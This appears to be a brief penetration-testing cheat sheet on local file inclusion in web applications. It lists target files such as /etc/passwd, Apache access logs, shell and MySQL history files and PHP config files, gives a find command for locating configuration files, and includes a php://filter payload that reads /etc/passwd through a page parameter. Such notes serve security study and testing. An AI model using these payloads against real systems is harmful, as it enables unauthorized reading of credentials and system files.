# LFI

usually happens when you have dynamic content based on a parameter

## common files

```text
/etc/knockd.conf
/etc/default/knockd
/etc/issue
/etc/motd
/etc/group
/etc/passwd
/var/www/html/.htaccess
/etc/httpd/logs/acces_log
/etc/httpd/logs/error_log
/var/www/logs/access_log
/var/www/logs/access.log
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/var/log/apache/access_log
/var/log/apache2/access_log
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/access_log
```

## user home directory and root

```text
bash_history
.mysql_history
.my.cnf
.profile
```

## configuration files

`find / -type f 2>/dev/null | grep -i conf` db/db.php db.php session.php config.php mysql.conf

## common things during LFI

?page=php://filter/convert.base64-encode/resource=/etc/passwd User-Agent: Mozilla/5.0 like Gecko

